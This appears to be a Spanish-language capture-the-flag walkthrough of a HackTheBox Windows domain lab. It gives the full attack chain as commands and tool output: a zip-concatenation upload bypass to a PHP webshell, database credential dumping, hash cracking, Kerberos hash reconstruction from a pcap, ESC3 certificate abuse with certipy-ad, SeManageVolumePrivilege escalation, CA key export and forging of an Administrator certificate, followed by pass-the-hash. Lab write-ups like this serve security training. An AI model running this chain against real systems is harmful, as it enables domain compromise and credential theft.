![image](https://github.com/user-attachments/assets/db9caef8-7004-4531-a5e0-b702c31535e2)

Una vez conectados a la VPN probamos conectividad con la maquina

```bash
ping -a 10.10.11.71
```

![image](https://github.com/user-attachments/assets/f0f5c587-7f56-4189-b5c8-c69f24d0593e)

ahora comenzamos con un reconocimiento con `nmap`

```bash
nmap -Pn -n -sT -p- --min-rate 5000 10.10.11.71 # reconocimiento basico
```

![image](https://github.com/user-attachments/assets/91cabf83-9ca1-4ea5-b849-f953f358629a)

ahora hacemos otro escaneo pero esta vez dirigido a los puertos reportados anteriormente

```bash
nmap -Pn -n -sT -p53,80,88,135,139,389,445,593,636,3268,3269,5985,9389,49667,49691,49692,49693,49712,49718,49737 -sCV --min-rate 5000 10.10.11.71
````

![image](https://github.com/user-attachments/assets/03df6ae2-4579-416e-8eea-830789962b4c)


podemos ver entre toda la informacion un dominio asi que agregamos a nuestro archivo `/etc/hosts` lo siguiente

```bash
nano /etc/hosts
```

![image](https://github.com/user-attachments/assets/c818a841-5e72-487e-a022-5b973f58fc0f)

Y ahora comenzamos analizando el servicio web que corre por el puerto 80

![image](https://github.com/user-attachments/assets/ab8f2dbe-8546-483a-9ec8-c199882d3b93)

despues de un analisis en la web no consigo vulnerabilidad asi que continuamos a la seccion `ACCOUNT` donde podemos hacer un registro

![image](https://github.com/user-attachments/assets/c11a93e4-b121-43a8-8453-81712e7ba172)

nos registramos y accedemos

![image](https://github.com/user-attachments/assets/3b1ff32d-b75b-46f4-b043-67c8a3921ce6)

una vez dentro podemos acceder a los cursos disponibles por lo que nos vamos a uno de ellos

![image](https://github.com/user-attachments/assets/f3e1071e-77e1-42e6-8b28-892f2cc17fcb)

nos vamos a `ENROLL THE COURSE` 

![image](https://github.com/user-attachments/assets/49b0be77-f72e-4c9b-9c1e-ae96d07e288b)

si nos vamos a alguno de los 2 `SUBMIT` que estan disponibles vemos que nos permite cargar archivos `.pdf .docx .pptx .xlsx & .zip`

![image](https://github.com/user-attachments/assets/132ea5f4-3e70-4e03-9339-7e85c9dc2917)

aqui intente bypassear la carga a traves de varios metodos (intentado de forma directa la carga de un archivo malicioso) pero no tuve exito, desspues de investiga un poco por la web
me consegui con que es posible ocultar carga maliciosa concatenando archivos `.zip` y esto lo logramos de la siguiente manera:

Primero vamos a necesitar un archivo pdf cualquiera pero legitimo (sin mcodigo malicioso) y lo comprimimos en un zip, luego creamos un directorio que contenga un archivo `.php` malicioso y comprimimos dicho
directorio en un .zip para terminar concatenando ambos archivos zip en un zip final que sera el que cargaremos a la web

![image](https://github.com/user-attachments/assets/026cf448-899c-4a89-b1c2-a45eea70ddcf)

ahora cargamos el archivo final por la web


https://github.com/user-attachments/assets/53e53aa6-8c97-4e68-b6f9-8e8b98df5d09

ahora que contamos con un `RCE` vamos alanzar una `revershell`

https://github.com/user-attachments/assets/074c3597-b499-44e6-8923-b4fd456fc628

la revershell que me funciono estaba en `base64`... Revisando los directorios me consigo con un `db.php` que al leer conseguimos credenciales de la base de datos

![image](https://github.com/user-attachments/assets/3b98b0a2-95bd-469a-9b4d-7cbfd71cd813)

![image](https://github.com/user-attachments/assets/b4c5c308-c09e-4e94-a8d9-7e2e507e04fc)

navegando por los directorios conseguimos el binario `mysql.exe` el cual usaremos para probar las credenciales que obtuvimos anteriormente

```bash
.\mysql.exe -u "certificate_webapp_user" -p'cert!f!c@teDBPWD' -e "show databases;"
```

![image](https://github.com/user-attachments/assets/653477a3-2f35-4414-9f74-e4aad5881b91)

funciona y obtenemos acceso a la base de datos asi que continuamos revisando a ver que conseguimos

```bash
.\mysql.exe -u "certificate_webapp_user" -p'cert!f!c@teDBPWD' -e "use certificate_webapp_db; show tables;"
```

![image](https://github.com/user-attachments/assets/6439f584-370c-4bb9-9b35-3aa5b9e645be)

vemos la tabla `users` asi que vamos a traer la informacion de dicha tabla

```bash
.\mysql.exe -u "certificate_webapp_user" -p'cert!f!c@teDBPWD' -e "use certificate_webapp_db; select * from users;"
```

![image](https://github.com/user-attachments/assets/084f86f3-aa4f-4465-8f35-21819bf74f6a)

obtenemos credenciales hasheadas asi que guardamos esta informacion en un archivo .txt para procesarlo mejor

![image](https://github.com/user-attachments/assets/a235aa73-3bf7-4d08-acca-01290612c1ef)

tenemos solo los usuarios y passwords, revisamos los usuarios del sistema y vemos a `Sara.B` que tambien aparece en las credenciales que hemos conseguido en la base de datos, asi que voy intentar crackear su hash

![image](https://github.com/user-attachments/assets/3f269a5a-b893-4331-b6c5-c3fc583aba3b)


```bash
hashcat -m 3200 -a 0 -w 4 -D 2 '$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6' /usr/share/wordlists/rockyou.txt
```

nota: Este comando de hashcat esta adaptado a mi caso particular por contar con tarjeta grafica, ya que la utilizo para acelerar los ataques, de usar hashcat deberan modificar el comando anterior


![image](https://github.com/user-attachments/assets/3df3c6d9-9694-4e02-a6eb-8c78e71c7e7e)

logramos crackear asi que vamos a testear si nos podemos conectar via winrm

```bash
evil-winrm -i 10.10.11.71 -u 'Sara.B' -p Blink182
```

![image](https://github.com/user-attachments/assets/cefb5154-d79c-44f1-b6aa-51e759f39c9f)

navegando por el sistema nos conseguimos con un archivo de texto y una archivo de trafico de red pcap

![image](https://github.com/user-attachments/assets/36c9452d-647c-4af9-b55c-ddb0ada69894)

me descargo el archivo .pcap y lo analizamos

![image](https://github.com/user-attachments/assets/f877ff79-0c9b-4492-9ffc-c002ba3dda84)

ya con el archivo en nuestra maquina lo abrimos con wireshark

![image](https://github.com/user-attachments/assets/244fa1fb-9518-41c3-a08e-94f0d4772943)

vemos que existe trafico kerberos

![image](https://github.com/user-attachments/assets/131e0798-3103-40b5-92f7-e1a599ab96ac)


asi que vamos a analizar el trafico kerberos y ver si es posible extraer algun hash

![image](https://github.com/user-attachments/assets/cee2423a-f321-4673-b518-40381d049133)

ya por aqui comienzo a ver informacion, lo que voy intentar hacer es reconstruir el hash kerberos buscando la siguiente informacion `CnameString | realm | cipher | salt` y si obtenemos esta informacion entonces reconstruimos el hash a partir de su 
estructura : `$krb5pa$18$<USER>$<DOMAIN>$<SALT>$<HASH_CIPHER>`

Como ya contamos con el CnameString y realm (disponibles en la imagen anterior), buscaremos el cipher y el salt

![image](https://github.com/user-attachments/assets/d50dc3e7-c301-49d9-b2ed-5c42612413dc)

por aqui ya conseguimos el cipher asi que solo falta el salt

![image](https://github.com/user-attachments/assets/7c40f4d9-fc34-4365-a596-33e9e6c0103d)

ya con toda la informacion reconstruimos el hash quedando asi:

```bash
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$CERTIFICATE.HTBLion.SK$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
```

ahora lo intentamos crackear

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashkerbero.txt
```

![image](https://github.com/user-attachments/assets/95d2781a-a700-4d24-9564-951fd0ee87a2)

testeamos si las credenciales son validas para el usuario `Lion.SK`

```bash
evil-winrm -i 10.10.11.71 -u 'Lion.SK' -p '!QAZ2wsx'
```

![image](https://github.com/user-attachments/assets/5406faca-b84e-4638-8bae-ee579e98b9d0)

obtenemos acceso como `Lion.SK`

![WhatsApp Image 2025-06-22 at 12 26 32](https://github.com/user-attachments/assets/fd2c0cba-0fa0-47b9-80ee-382bf5215268)

en este punto llegamos a conseguir certificados vulnerables en el sistema

```bash
certipy-ad find -u 'Lion.SK@certificate.htb' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -stdout > certificates_vul.txt
```

```bash
cat certificates_vul.txt                                                                                    
[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 18 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'Certificate-LTD-CA' via RRP
[*] Successfully retrieved CA configuration for 'Certificate-LTD-CA'
[*] Checking web enrollment for CA 'Certificate-LTD-CA' @ 'DC01.certificate.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : Certificate-LTD-CA
    DNS Name                            : DC01.certificate.htb
    Certificate Subject                 : CN=Certificate-LTD-CA, DC=certificate, DC=htb
    Certificate Serial Number           : 75B2F4BBF31F108945147B466131BDCA
    Certificate Validity Start          : 2024-11-03 22:55:09+00:00
    Certificate Validity End            : 2034-11-03 23:05:09+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFICATE.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        ManageCertificates              : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Enroll                          : CERTIFICATE.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : Delegated-CRA
    Display Name                        : Delegated-CRA
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-05T19:52:09+00:00
    Template Last Modified              : 2024-11-05T19:52:10+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain CRA Managers
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain CRA Managers
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.

    Template Name                       : SignedUser
    Display Name                        : Signed User
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    RA Application Policies             : Certificate Request Agent
    Authorized Signatures Required      : 1
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-03T23:51:13+00:00
    Template Last Modified              : 2024-11-03T23:51:14+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Domain Users
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Domain Users
                                          CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain Users
    [*] Remarks
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template requires a signature with the Certificate Request Agent application policy.
```

esto resulta interesante porque podriamos explotarlo de la siguiente manera:
> primero obtenemos un certificado de Delegated-CRA (con la ca `Certificate-LTD-CA` y el template `Delegated-CRA` que ya vimos son vulnerable a un `ESC3`),
> despues usamos el certificado anterior para firmar una solicitud en el template SignedUser y asi 
> obtenemos el certificado SignedUser para autenticarnos como otro usuario

```bash
certipy-ad req -u 'Lion.SK' -p '!QAZ2wsx' -ca 'Certificate-LTD-CA' -target 'DC01.certificate.htb' -ns 10.10.11.71 -template 'Delegated-CRA' # primer paso: obtenemos el certificado
```

![image](https://github.com/user-attachments/assets/862f9059-a3de-49e1-a29d-a1ff5ff853cf)

Usamos el certificado genreado antes para solicitar `SignedUser` en nombre de otro usuario, en este caso podemos solicitarlo para el usuario `Ryan.K`

```bash
certipy-ad req -u 'Lion.SK@certificate.htb' -p '!QAZ2wsx' -ca 'Certificate-LTD-CA' -target 'DC01.certificate.htb' -ns 10.10.11.71 -template 'SignedUser' -on-behalf-of 'Ryan.K' -pfx 'lion.sk.pfx'
```

![image](https://github.com/user-attachments/assets/428cd598-2b49-4353-afe2-42fe51e5efd9)

ya con esto podremos autenticarnos como el usuario `Ryan.K`

```bash
certipy-ad auth -pfx ryan.k.pfx -dc-ip 10.10.11.71 -domain certificate.htb
```

![WhatsApp Image 2025-06-22 at 13 05 01](https://github.com/user-attachments/assets/bf296a43-a8ae-452e-97e1-ce6669bc9604)

esto nos a generado el hash `NT` del usuario por lo que podremos usarlo para hacer `Pass-The-Hash`

![image](https://github.com/user-attachments/assets/32f67bf8-195f-4ac4-a596-fc16999b3fc4)

ahora como el usuario `ryan.k` podemos ver un permiso que no tenian los demas usuarios, el permiso `SeManageVolumePrivilege` asi que investigamos y me consigo con que con este permiso es posible obtener una escalada de privilegios, resumiendo un poco, este privilegio permite tomar el control total desde `C:\` asi que nos descargamos el binario que se encarga de explotar esta vulnerabilidad desde `https://github.com/CsEnox/SeManageVolumeExploit/releases`

Una vez descargado lo subimos a la maquina objetivo

```bash
upload SeManageVolumeExploit.exe
```

![image](https://github.com/user-attachments/assets/457c711f-92cf-4861-9fd9-56327175c3aa)

ejecutamos el binario y luego comprobamos si fue posible explotarlo 

![image](https://github.com/user-attachments/assets/e729027b-907b-4d76-9156-6f689050c30f)

aunque termino funcioando, en un principio no funcionaba por lo cual tuve que intentar varias veces hasta que termino teniendo exito!! y otro detalle que observe es que estos permisos parecen ser temporales.... ahora si validamos los certificados veremos esto:

```bash
certutil -store My
```

![image](https://github.com/user-attachments/assets/10a26bad-7d84-4941-abf5-281d50bd7b6d)


observamos 3 certificados vamos intentar hacernos con el certificado `Certificate-LTD-CA`, asi que crearemos un directorio en la raiz e intentaremos extraer el certificado a dicho directorio

```bash
mkdir tempx
```

```bash
certutil -exportPFX my "Certificate-LTD-CA" C:\tempx\export.pfx
```

![image](https://github.com/user-attachments/assets/16d221e4-af49-41c1-92ec-bdf6fc615203)

vemos que fue posible extraer el certificado, por ultimo nos descargamos a nuestra maquina el certificado para asi poder crear otros certificados falsos

```bash
download export.pfx
```

![image](https://github.com/user-attachments/assets/473d1d2a-e8f9-4bad-aae3-654475d2b81a)

ahora generamos un certificado para Administrator

```bash
certipy-ad forge -ca-pfx export.pfx -upn Administrator -out pwn.pfx
```

![image](https://github.com/user-attachments/assets/3eef4a6d-190a-4665-8ec9-566442890c54)

luego generamos el hash NT 

```bash
certipy-ad auth -pfx pwn.pfx -ns 10.10.11.71 -dc-ip 10.10.11.71 -domain CERTIFICATE.HTB
```

![image (1)](https://github.com/user-attachments/assets/3b7cc3ea-bdc2-4d48-9ba5-0b7793956045)


con esto ya podemos hacer `Pass-The-Hash` via `Winrm`

```bash
evil-winrm -i 10.10.11.71 -u 'Administrator' -H '*********************'
```

![image (2)](https://github.com/user-attachments/assets/43a4b3b9-22c8-4294-b9d4-69214c43f05c)


tenemos el control total del sistema con la CA bajo nuestro poder! esto nos permitiria muchas acciones maliciosas como firmar malware y asi evitar detección por políticas de restricción de software, includo podriamos inteceptar trafico cifrado si el cliente confia en la CA y tambien nos proporciona persistencia en el sistema sin depender de password 

>> PD: Es posible extraer el Certificado porque anteriormente hemos explotado una vuelnerabilidad que nos permite tomar el control de `C:\` con el privilegio `SeManageVolumePrivilege`, esto ocurre asi ya
>> que al extraer el certificado el comando `certutil -exportPFX ...` necesita crear archivos temporales en `C:\` necesarios para exportar la clave privada, asi como acceder a la clave privada sin
>>  bloqueos causados por la falta de permisos de escritura y esto lo logramos gracias a tomar el control de `C:\`; es decir, sin explotar el fallo de seguridad previo a la extraccion del certificado no
>> tendriamos exito




